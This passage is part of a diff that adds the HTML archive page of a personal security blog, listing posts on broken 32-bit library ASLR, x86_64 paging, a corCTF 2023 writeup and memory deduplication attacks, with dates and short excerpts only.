+    <p class="archive__item-excerpt" itemprop="description">As it turns out, on recent Ubuntu, Arch, Fedora, and likely other distro’s releases, with kernel versions &gt;=5.18, library ASLR is literally broken for 32-...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/understanding-paging/" rel="permalink">Understanding x86_64 Paging
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-12-27T00:00:00+00:00">December 27, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          22 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">I’ve spent quite a lot of time messing with x86_64 page tables, understanding address translation is not easy and when I started learning about it I felt lik...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/corctf-sysruption/" rel="permalink">corCTF 2023: sysruption writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-07-30T00:00:00+00:00">July 30, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          25 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/dedup-attacks/" rel="permalink">Understanding Memory Deduplication Attacks
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-06-17T00:00:00+00:00">June 17, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          13 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">I recently came across a bunch of research describing attacks on memory deduplication, it has been used to fingerprint systems[1], crack (K)ASLR[2,3,4], leak...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://twitter.com/zolutal" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+      
+        
+          <li><a href="https://github.com/zolutal" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 Justin Miller. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
